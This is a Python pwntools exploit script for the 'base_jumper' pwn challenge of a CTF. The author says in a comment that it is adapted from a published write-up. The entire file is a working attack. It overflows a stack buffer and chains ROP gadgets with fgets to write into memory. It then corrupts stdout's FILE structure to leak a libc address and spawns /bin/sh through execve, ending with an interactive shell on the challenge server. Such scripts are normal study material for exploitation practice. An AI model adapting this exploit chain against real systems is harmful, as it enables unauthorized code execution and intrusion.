# i couldnt solve on time..
# reference: https://ptr-yudai.hatenablog.com/entry/2020/07/26/213605

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './base_jumper'
HOST = 'basejumper.3k.ctf.to'
PORT = 3147 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x667])

leave = 0x400666
gift = 0x400637
rbp = 0x004005b8
rdi = 0x00400763
rsi_p1 = 0x400761
p1 = 0x400762

ret = rdi+1

payload1 =  'A'*(10+8)
payload1 += flat(gift, rsi_p1, 0x020, 0xdeadbeef, rdi, 0x601000, elf.plt.fgets)
payload1 += flat(gift, rsi_p1, 0x008, 0xdeadbeef, rdi, 0x601028, elf.plt.fgets)
payload1 += flat(gift, rsi_p1, 0x008, 0xdeadbeef, rdi, 0x601038, elf.plt.fgets)
payload1 += flat(gift, rsi_p1, 0x400, 0xdeadbeef, rdi, 0x601048, elf.plt.fgets)
payload1 += flat(rbp, 0x601000-8, leave)
payload1 =  payload1.ljust(0x400, 'A')

payload2 =  flat(rsi_p1, 0x20, 0xdeadbeef, rdi)
payload3 =  p64(p1)
payload4 =  p64(p1)

payload5 =  flat(ret) * 0x20
payload5 += flat(gift, rsi_p1, 0x21, 0xdeadbeef, elf.plt.fgets) # "0x21" for null terminate at *stdout +0x20
payload5 += flat(gift, rsi_p1, 0x20, 0xdeadbeef, rdi, 0x601000, elf.plt.fgets)
payload5 += flat(ret) * 0x20
payload5 += flat(gift, rsi_p1, 0x200, 0xdeadbeef, rdi, 0x601048, elf.plt.fgets)
payload5 += flat(rbp, 0x601000-8, leave)
payload5 =  payload5.ljust(0x400, 'A')

payload6 =  flat(ret)*3
payload6 += flat(rdi)

payload7 =  flat(ret)*0x20
payload7 += flat(elf.plt.fflush)
payload7 += flat(elf.sym.vuln)
payload7 =  payload7.ljust(0x200, 'A')

r.send(payload1[:-1])# 0x400
r.send(payload2[:-1])# 0x20
r.send(payload3[:-1])# 8
r.send(payload4[:-1])# 8
r.send(payload5[:-1])# 0x400
r.send(p64(0xfbad1800) + '\x00'*0x18)# 0x20
r.send(payload6[:-1])# 0x20
r.send(payload7[:-1])# 0x200

leak = u64(r.recv()[8:16])
base = leak - 0x3ed8b0
dbg('leak')
dbg('base')

rdx = base + 0x1b96
system = base + 0x4f4e0 # stack is too short to call
binsh = base + 0x1b40fa
execve = base + 0xe4e90

payload = 'A'*18
# payload += flat(rdi, binsh, ret, system)
payload += flat(rdi, binsh, rdx, 0, rsi_p1, 0, 0, execve)
r.sendline(payload)

r.interactive()
r.close()
